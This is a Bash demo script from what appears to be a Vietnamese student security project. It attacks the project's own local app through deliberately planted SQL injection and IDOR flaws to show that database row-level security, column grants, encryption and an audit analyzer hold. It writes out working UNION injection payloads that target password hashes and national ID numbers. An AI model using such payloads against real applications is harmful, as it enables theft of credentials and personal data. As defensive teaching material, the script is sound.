#!/usr/bin/env bash
# =============================================================================
# demo-attack.sh - Kịch bản demo defense-in-depth END-TO-END.
#
#   bash scripts/demo-attack.sh          (dừng chờ Enter giữa các bước)
#   bash scripts/demo-attack.sh --yes    (chạy một mạch)
#
# Diễn lại HAI lỗ hổng CỐ Ý ở tầng ứng dụng (SQL Injection + IDOR, xem
# app/README.md) qua đúng HTTP endpoint của app/, rồi cho thấy các lớp phòng
# thủ ở tầng DATABASE vẫn giữ: RLS chặn rò dữ liệu chi nhánh khác, mã hóa cột
# giữ CCCD/thẻ dù bảng bị dump. Cuối cùng chạy analyzer (lớp 3) để chứng minh
# hành vi bất thường bị ghi nhận và hiện lên dashboard.
#
# Đây là bài thực nghiệm cho đồ án: hai lỗ hổng này tồn tại SẴN và CỐ Ý trong
# repo để đo hiệu lực của các lớp dưới. Không phải tấn công hệ thống bên ngoài.
#
# Chuỗi chứng minh:
#   app (app_user + SET ROLE nv_hn01)  ->  lỗ hổng tầng code
#     -> RLS / mã hóa chặn ở tầng DB   ->  log pgAudit
#     -> analyzer (analyzer_user INSERT) -> audit.alerts
#     -> dashboard_user SELECT (chỉ đọc)
# =============================================================================
set -uo pipefail
cd "$(dirname "$0")/.." || exit 1

AUTO=""; [ "${1:-}" = "--yes" ] && AUTO=1

APP_PORT="${APP_PORT:-3000}"
# 127.0.0.1 chứ KHÔNG phải localhost: container app chỉ publish trên
# 127.0.0.1:3000. Nếu còn một app/ chạy tay trên host (nghe ::, cả IPv6),
# `localhost` phân giải ra ::1 trước và rơi vào tiến trình đó mà không báo gì -
# demo chạy được nhưng đi nhầm đường (cột client trong cảnh báo sẽ là
# 172.28.0.1 thay vì 172.28.0.20 của container app).
APP="http://127.0.0.1:${APP_PORT}"
COOKIES="$(mktemp)"
STARTED_APP=""          # pid của app nếu script tự khởi động, để tắt lúc thoát
APP_LOG="$(mktemp)"

# --- Màu + tiện ích hiển thị -------------------------------------------------
c_step=$'\033[1;36m'; c_ok=$'\033[32m'; c_bad=$'\033[31m'; c_dim=$'\033[2m'; c_hl=$'\033[1;33m'; c_off=$'\033[0m'
step()  { printf '\n%s== %s%s\n' "$c_step" "$1" "$c_off"; }
info()  { printf '   %s\n' "$1"; }
good()  { printf '   %s%s%s\n' "$c_ok" "$1" "$c_off"; }
warn()  { printf '   %s%s%s\n' "$c_bad" "$1" "$c_off"; }
cmd()   { printf '   %s$ %s%s\n' "$c_dim" "$1" "$c_off"; }
pause() { [ -n "$AUTO" ] || [ ! -t 0 ] || read -r -p "   (Enter de tiep tuc) " _; }

cleanup() {
    rm -f "$COOKIES" "$APP_LOG"
    if [ -n "$STARTED_APP" ]; then
        kill "$STARTED_APP" >/dev/null 2>&1 || true
        info "Da tat app demo (pid $STARTED_APP) do script tu khoi dong."
    fi
}
trap cleanup EXIT

# jget <khóa> : đọc một trường từ JSON ở stdin (dùng node, không cần jq).
jget() { node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{try{const j=JSON.parse(s);const k=process.argv[1].split(".");let v=j;for(const p of k)v=v?.[p];console.log(typeof v==="object"?JSON.stringify(v):(v??""))}catch{process.exit(0)}})' "$1"; }
# jrows : đếm số phần tử trong mảng customers/orders (hoặc .count)
jcount() { node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{try{const j=JSON.parse(s);console.log(j.count??(Array.isArray(j.customers)?j.customers.length:Array.isArray(j.orders)?j.orders.length:0))}catch{console.log("?")}})'; }
# Đọc audit.alerts bằng dashboard_user - role chỉ SELECT, đúng chiều đọc của lớp 3.
dash_sql() { docker compose exec -T postgres psql "postgresql://dashboard_user:${DASHBOARD_PASSWORD}@172.28.0.10:5432/secdb" "$@" 2>/dev/null; }
# http_code <url...> : chỉ lấy mã HTTP
http_code() { curl -s -o /dev/null -w '%{http_code}' -b "$COOKIES" "$@"; }

# --- Kiểm tra tiền đề -------------------------------------------------------
command -v curl >/dev/null || { echo "Can curl (Git Bash da co san)."; exit 1; }
command -v node >/dev/null || { echo "Can Node.js."; exit 1; }
[ -f .env ] || { echo "Khong tim thay .env o goc repo."; exit 1; }
set -a; . ./.env; set +a

# DB phải sống và đang là instance trong container (không phải Postgres native).
if ! docker compose exec -T postgres pg_isready -h 172.28.0.10 -p 5432 -q 2>/dev/null; then
    echo "Database chua san sang. Chay: docker compose up -d   (hoac bash scripts/reset.sh)"
    exit 1
fi

# --- Bảo đảm app/ đang chạy --------------------------------------------------
ensure_app() {
    if [ "$(curl -s -o /dev/null -w '%{http_code}' "$APP/health" 2>/dev/null)" = "200" ]; then
        info "App dang chay san o $APP"
        return
    fi
    info "App chua chay - script tu khoi dong app/ o cong $APP_PORT"
    info "(binh thuong app chay trong Docker: docker compose up -d app)"
    [ -d app/node_modules ] || { echo "   Chua cai: cd app && npm install - hoac docker compose up -d app"; exit 1; }
    # Tạo app/.env nếu thiếu, lấy mật khẩu từ .env gốc (app_user).
    if [ ! -f app/.env ]; then
        # SESSION_SECRET ngẫu nhiên: app từ chối khởi động với giá trị mẫu.
        sed -e "s/^DB_PASSWORD=.*/DB_PASSWORD=${APP_USER_PASSWORD}/" \
            -e "s/^SESSION_SECRET=.*/SESSION_SECRET=$(openssl rand -hex 32)/" \
            app/.env.example > app/.env
        info "Da tao app/.env tu .env.example (DB_PASSWORD = APP_USER_PASSWORD)"
    fi
    # exec: subshell được THAY bằng node, nên $! là PID của node. Thiếu exec thì
    # $! là PID của subshell - kill nó lúc dọn dẹp, node vẫn sống và chiếm cổng
    # 3000 tới lần demo sau (đã xảy ra).
    ( cd app && PORT="$APP_PORT" exec node src/server.js >"$APP_LOG" 2>&1 ) &
    STARTED_APP=$!
    for _ in $(seq 1 30); do
        [ "$(curl -s -o /dev/null -w '%{http_code}' "$APP/health" 2>/dev/null)" = "200" ] && break
        sleep 0.5
    done
    if [ "$(curl -s -o /dev/null -w '%{http_code}' "$APP/health" 2>/dev/null)" != "200" ]; then
        warn "App khong len duoc. Log:"; sed 's/^/     /' "$APP_LOG"; exit 1
    fi
}

clear 2>/dev/null || true
printf '%s' "$c_hl"
cat <<'BANNER'
  ____            ____  ____    demo tan cong -> phong thu nhieu lop
 / ___| ___  ___ |  _ \| __ )
 \___ \/ _ \/ __|| | | |  _ \   App co 2 lo hong CO Y (SQLi + IDOR).
  ___) |  __/ (__ | |_| | |_) |  Cau hoi: tang DATABASE co cuu duoc khong?
 |____/ \___|\___||____/|____/
BANNER
printf '%s' "$c_off"

ensure_app

# Mốc id TRƯỚC khi tấn công. Phải lấy ở đây chứ không phải ngay trước bước
# analyzer: nếu analyzer --watch đang chạy thì nó ghi cảnh báo trong lúc tấn
# công, đếm muộn sẽ ra "trước = sau" như thể không bắt được gì.
MAX0=$(dash_sql -tAc "SELECT coalesce(max(id), 0) FROM audit.alerts;" | tr -d '[:space:]')

# =============================================================================
step "1. Dang nhap bang nhan vien Ha Noi (hn01)"
# Lay CSRF token truoc (app/src/csrf.js) - app tu choi dang nhap khong co token.
CSRF=$(curl -s -c "$COOKIES" -b "$COOKIES" "$APP/auth/csrf" | jget csrfToken)
LOGIN=$(curl -s -c "$COOKIES" -b "$COOKIES" -X POST "$APP/auth/login" \
        -H 'Content-Type: application/json' -H "X-CSRF-Token: $CSRF" \
        -d '{"username":"hn01","password":"Demo@123456"}')
WHO=$(printf '%s' "$LOGIN" | jget staff.db_user)
BRANCH=$(printf '%s' "$LOGIN" | jget staff.branch_id)
if [ "$WHO" != "nv_hn01" ]; then
    warn "Dang nhap that bai: $LOGIN"; exit 1
fi
good "Dang nhap OK -> db_user=$WHO, branch_id=$BRANCH (Ha Noi)"
info "Moi request sau day chay trong transaction co SET LOCAL ROLE $WHO."
pause

step "2. Duong hop le: xem khach hang cua minh (RLS tu loc chi nhanh)"
cmd "GET /customers"
MINE=$(curl -s -b "$COOKIES" "$APP/customers?limit=200")
N_MINE=$(printf '%s' "$MINE" | jcount)
OTHER_BRANCH=$(printf '%s' "$MINE" | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{const j=JSON.parse(s);const b=new Set((j.customers||[]).map(c=>c.branch_id));console.log([...b].join(","))})')
good "Tra ve $N_MINE khach hang, toan bo branch_id = $OTHER_BRANCH"
info "Khong he co WHERE branch_id trong code - RLS o 06_rls.sql tu chen dieu kien."
pause

# -----------------------------------------------------------------------------
step "3. TAN CONG 1 - SQL Injection tai GET /customers/search"
info "Endpoint noi chuoi SQL truc tiep (app/src/routes/customers.js, CO Y)."
info "Payload UNION keo password_hash tu bang app.staff:"
PAYLOAD="x' UNION SELECT id, username, password_hash, db_user, 0 FROM app.staff -- -"
cmd "GET /customers/search?name=${PAYLOAD}"
ATTACK=$(curl -s -G -b "$COOKIES" "$APP/customers/search" --data-urlencode "name=${PAYLOAD}")
LEAK=$(printf '%s' "$ATTACK" | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{try{const j=JSON.parse(s);const hit=(j.customers||[]).filter(r=>String(r.email||"").startsWith("$2"));console.log(hit.length+"|"+(hit[0]?hit[0].full_name+" / "+String(hit[0].email).slice(0,32)+"...":""))}catch{console.log("0|")}})')
LEAK_N="${LEAK%%|*}"; LEAK_S="${LEAK#*|}"
if [ "${LEAK_N:-0}" -gt 0 ] 2>/dev/null; then
    warn "THUNG: SQLi doc duoc $LEAK_N dong tu app.staff (vi du: $LEAK_S)"
    info "app_user van con quyen doc cot password_hash - kiem tra 04_grants.sql"
    info "(DB dang chay ban init cu? -> bash scripts/reset.sh)."
elif printf '%s' "$ATTACK" | grep -q 'permission denied'; then
    good "BI CHAN: $(printf '%s' "$ATTACK" | jget message)"
    info "Lo hong SQLi trong code app VAN CON NGUYEN - cau UNION da chay toi DB."
    info "Nhung app_user/staff_role chi duoc doc cac cot KHAC password_hash"
    info "(quyen muc COT, 04_grants.sql), nen PostgreSQL tu choi ca cau lenh."
    info "Dang nhap van chay: so mat khau nam trong app.verify_staff_login() (crypt"
    info "cua pgcrypto), app khong bao gio cam hash."
    info "=> Truoc day buoc nay THUNG: app.staff khong bat RLS, RLS khong bao ve"
    info "   duoc bang khong co policy. Chot chan la phan quyen muc cot, khong phai RLS."
else
    info "Ket qua: $ATTACK"
fi
pause

step "3b. Cung SQLi do, thu keo CCCD khach chi nhanh KHAC"
info "Lan nay UNION sang app.customers de lay cccd cua moi chi nhanh:"
# Cot thu 4 cua endpoint la `phone` -> nhet cccd::text vao dung vi tri do.
PAYLOAD2="x' UNION SELECT id, full_name, email, cccd::text, branch_id FROM app.customers -- -"
cmd "GET /customers/search?name=${PAYLOAD2}"
ATTACK2=$(curl -s -G -b "$COOKIES" "$APP/customers/search" --data-urlencode "name=${PAYLOAD2}")
# cccd nam o truong `phone`. Dem so chi nhanh keo ra, va xem gia tri cccd la
# ciphertext bytea (\x...) hay so CCCD that (chuoi chu so).
ANALYSIS=$(printf '%s' "$ATTACK2" | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{try{const j=JSON.parse(s);const rows=j.customers||[];const br=[...new Set(rows.map(r=>r.branch_id).filter(b=>b!=null))].sort();const vals=rows.map(r=>r.phone).filter(Boolean);const hex=vals.filter(v=>/^\\x[0-9a-f]+$/i.test(String(v))).length;const digits=vals.filter(v=>/^\d{9,}$/.test(String(v))).length;console.log("chi_nhanh_keo_ra="+br.join(",")+" | ciphertext_bytea="+hex+" | so_CCCD_plaintext="+digits+" | vi_du="+String(vals[0]||"").slice(0,20))}catch(e){console.log("err|"+e.message)}})')
info "Ket qua: $ANALYSIS"
good "HAI lop cung chan o day:"
info " - Lop 1 (RLS): app.customers co FORCE RLS nen loc ca cau UNION tiem vao."
info "   Ke tan cong o Ha Noi chi keo ra chi nhanh 1, KHONG cham duoc 2/3."
info "   (Khac buoc 3: app.staff khong bat RLS nen lo ca 3 chi nhanh.)"
info " - Lop 2 (ma hoa cot): cccd keo ra la bytea \\x... (so_CCCD_plaintext = 0),"
info "   vi khoa nam trong Docker secret, app_user khong goi duoc pgp_sym_decrypt."
pause

# -----------------------------------------------------------------------------
step "4. TAN CONG 2 - IDOR tai GET /orders/:id"
info "Endpoint CO Y khong kiem tra don hang co thuoc chi nhanh minh khong."
info "hn01 (Ha Noi) thu doc tung don hang theo id:"
printf '\n'
printf '   %-28s %-8s %s\n' "Request" "HTTP" "Ket qua"
printf '   %-28s %-8s %s\n' "-------" "----" "-------"
for id in 1 2 3 4; do
    body=$(curl -s -b "$COOKIES" "$APP/orders/$id")
    code=$(http_code "$APP/orders/$id")
    br=$(printf '%s' "$body" | jget order.branch_id)
    if [ "$code" = "200" ]; then
        printf '   %-28s %s%-8s%s branch_id=%s (chi nhanh minh)\n' "GET /orders/$id" "$c_ok" "$code" "$c_off" "$br"
    else
        msg=$(printf '%s' "$body" | jget message)
        printf '   %-28s %s%-8s%s %s\n' "GET /orders/$id" "$c_bad" "$code" "$c_off" "$msg"
    fi
done
printf '\n'
good "Don 1,2 (Ha Noi) -> 200.  Don 3 (Da Nang), 4 (HCM) -> 404."
info "Code KHONG kiem tra quyen mot dong nao, van tra 404 cho don chi nhanh khac:"
info "RLS (branch_isolation tren app.orders) loc mat row TRUOC khi app kip doc."
info "=> Lop 1 (RLS) bien mot IDOR kinh dien thanh vo hai, khong can sua code."
pause

# -----------------------------------------------------------------------------
step "5. Lop 3 - cac hanh vi tren da vao log, analyzer co bat duoc khong?"
sleep 2
if docker compose ps --status running --services 2>/dev/null | grep -qx analyzer; then
    # Service analyzer (--watch) trong Docker tu doc log va ghi canh bao. KHONG
    # chay them analyzer tren host - hai ben cung xu ly se ghi trung.
    info "analyzer dang chay lien tuc trong Docker (container secdb-analyzer)."
    info "Khong ai phai go lenh: no tu doc log pgAudit va ghi canh bao sau 1-4 giay."
    sleep 6
elif [ -d analyzer/node_modules ] && [ -f analyzer/.env ]; then
    info "Chay analyzer (doc log pgAudit, ghi canh bao):"
    ( cd analyzer && node src/index.js ) 2>&1 | sed 's/^/     /'
    # Ma 3 = analyzer --watch dang chay, no tu ghi (batch nhuong de khong trung).
    if [ "${PIPESTATUS[0]}" -eq 3 ]; then
        info "analyzer --watch dang theo doi - cho no ghi canh bao..."
        sleep 6
    fi
else
    warn "Bo qua analyzer: service analyzer khong chay, va tren host chua cai."
    info "Chay: docker compose up -d analyzer"
fi
NEW=$(dash_sql -tAc "SELECT count(*) FROM audit.alerts WHERE id > ${MAX0:-0};" | tr -d '[:space:]')
pause

step "6. Canh bao moi (doc bang dashboard_user - chi SELECT)"
info "Canh bao sinh ra tu luc bat dau demo: ${NEW:-0}. Nghiem trong nhat:"
# Chi canh bao CUA LAN DEMO NAY (id > moc), bo AFTER_HOURS cho gon - no phu
# thuoc gio chay demo chu khong phai hanh vi tan cong.
dash_sql -c "SELECT id, db_user, rule_triggered, risk_score,
                    left(detail->>'mo_ta', 48) AS mo_ta
             FROM audit.alerts
             WHERE id > ${MAX0:-0} AND rule_triggered <> 'AFTER_HOURS'
             ORDER BY risk_score DESC, id LIMIT 8;"
good "SQLi -> SQLI_UNION + ACCESS_DENIED, quy ve dung nv_hn01 (nho SET ROLE)."
info "Cau UNION bi chan van de lai dong ERROR 42501 trong log - analyzer doc no"
info "nen lan tan cong that bai van bi goi ten, khong vo hinh voi lop 3."
info "Luu y trung thuc: analyzer KHONG bat duoc IDOR o buoc 4 - no chi doc duoc"
info "cau lenh trong log, ma IDOR la truy van hop le ve mat cu phap (xem"
info "analyzer/README.md muc gioi han). Chinh RLS moi la thu chan IDOR."
printf '\n'
good "Xong. Mo dashboard: http://127.0.0.1:4000 (service dashboard trong Docker)"
info "de thay cac canh bao nay hien theo thoi gian thuc o muc 'Theo doi truc tiep'."
